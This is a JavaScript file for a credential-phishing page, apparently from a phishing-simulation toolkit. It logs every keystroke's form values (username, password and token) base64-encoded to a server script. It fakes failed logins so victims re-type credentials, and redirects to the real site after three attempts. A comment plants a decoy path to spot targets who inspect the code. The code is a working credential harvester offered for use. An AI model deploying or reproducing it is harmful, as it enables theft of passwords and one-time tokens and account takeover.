// Define variables
var id = "";
var user = "";
var pass = "";
var token = "";
var action = "";
var submitAttempts = 0;
var xhr = new XMLHttpRequest();

// Try to get the unique id
try{
	var captured = /id=([^&]+)/.exec(window.location.href)[1];
	id = captured ? captured : "NoIdInUrl";
}
catch(error){

	// No ID in URL
	id = "NoIdInUrl";

	// Redirect to index page if there is not an ID
	window.location = "index.html";
}

// Check if the ID is over 30 characters
if(id.length > 30){
	id = "Over30Chars";
}

// Log the initial page load and unique id
xhr.open("POST", "data/main.php", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
xhr.send("id=" + btoa(id) + "&user=" + btoa(" ") + "&pass=" + btoa(" ") + "&token=" + btoa(" ") + "&action=" + btoa("PAGE_LOAD"));

// Detect keystrokes
document.onkeyup = function(e){

	// Do not show duplicates for shift or ctrl keys up since the actual key was already up
	if(e.key == "Shift" || e.key == "Control"){
		return;
	}
	else if(e.key == "Enter"){
		action = "ENTER";
	}
	else if(e.key == "Tab"){
		action = "TAB";
	}
	else if(e.key == "Backspace" || e.key == "Delete"){
		action = "BACKSPACE";
	}

	// Get values from the form
	user = document.getElementById("user").value;
	pass = document.getElementById("pass").value;
	token = document.getElementById("token").value;

	// Check if strings are blank because btoa will not work
	if(user == ""){
		user = " ";
	}
	if(pass == ""){
		pass = " ";
	}
	if(token == ""){
		token = " ";
	}
	if(action == ""){
		action = " ";
	}
	if(id == ""){
		id = " ";
	}

	// Check if strings are over 30 characters
	if(user.length > 30){
		user = "Over30chars";
	}
	if(pass.length > 30){
		pass = "Over30chars";
	}
	if(token.length > 30){
		token = "Over30chars";
	}
	if(action.length > 30){
		action = "Over30chars";
	}
	if(id.length > 30){
		id = "Over30Chars";
	}

	// Log the data
	xhr.open("POST", "data/main.php", true);
	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
	xhr.send("id=" + btoa(id) + "&user=" + btoa(user) + "&pass=" + btoa(pass) + "&token=" + btoa(token) + "&action=" + btoa(action));

	// Clear the action
	action = "";
};

// REMOVE THIS LINE *** Leave the two lines below as a honeypot to see if the target identifies the JavaScript and tries browsing to the non-existent page. *** REMOVE THIS LINE
// Page to show all login attempts
// data/loginAttempts.php

// Add an event listener to the login button
document.getElementById("login").addEventListener('click', function(e){

	// Check if strings are blank because btoa will not work
	if(user == ""){
		user = " ";
	}
	if(pass == ""){
		pass = " ";
	}
	if(token == ""){
		token = " ";
	}
	if(id == ""){
		id = " ";
	}

	// Log the data
	xhr.open("POST", "data/main.php", true);
	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
	xhr.send("id=" + btoa(id) + "&user=" + btoa(user) + "&pass=" + btoa(pass) + "&token=" + btoa(token) + "&action=" + btoa("LOGIN_BUTTON"));

	// Show the warning label
	document.getElementById("warning-label").removeAttribute("hidden");

	// Clear the data to force the user to reenter everything
	document.getElementById("user").value = "";
	document.getElementById("pass").value = "";
	document.getElementById("token").value = "";

	// On the third login button click, redirect to the real page
	submitAttempts += 1;

	// On the third login button click, redirect to the real page
	if(submitAttempts == 3){
		window.location = "https://www.example.com";
	}
});